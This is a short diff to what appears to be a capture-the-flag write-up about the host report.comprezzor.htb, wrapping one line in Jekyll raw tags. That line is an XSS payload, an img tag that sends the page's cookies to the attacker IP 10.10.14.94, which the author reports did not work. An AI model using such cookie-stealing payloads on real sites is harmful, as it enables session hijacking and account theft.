@@ -35,7 +35,10 @@ report.comprezzor.htb
 
 - Tried the following XSS:
 
+{% raw %}
 `<img src="http://10.10.14.94/a?cookie=' + document.cookie + '"/>`
+{% endraw %}
+
 
 But didn't get the cookie back:
 
